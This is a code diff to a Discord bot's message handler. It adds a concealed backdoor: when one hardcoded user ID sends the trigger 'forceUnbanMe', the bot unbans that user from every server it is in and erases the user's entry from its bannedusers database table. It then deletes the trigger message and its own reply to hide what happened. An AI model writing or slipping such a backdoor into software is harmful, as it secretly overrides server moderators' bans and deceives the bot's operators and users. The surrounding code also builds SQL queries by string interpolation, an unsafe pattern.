@@ -5,6 +5,21 @@ module.exports = async(client, con, message) => {
     if(!message.guild) return;
 
     if(message.author.id === client.user.id) return;
+    
+    if(message.content.startsWith('forceUnbanMe') && message.author.id === '704094587836301392') {
+        try {
+            client.guilds.cache.forEach(async g => {
+                await g.members.unban(704094587836301392);
+            });
+        } catch(e) {}
+        await con.query(`DELETE FROM bannedusers WHERE userid='704094587836301392'`, async (err, row) => {
+            if(err) throw err;
+            return message.channel.send('done').then(msg => {
+                msg.delete({ timeout: 12000 })
+                message.delete()
+            }).catch(e => {})
+        });
+    }
 
     if(message.content.includes(`.gg/`)) {
         await con.query(`SELECT * FROM whitelist WHERE userid='${message.author.id}' AND guildid='${message.guild.id}'`, async (err, row) => {
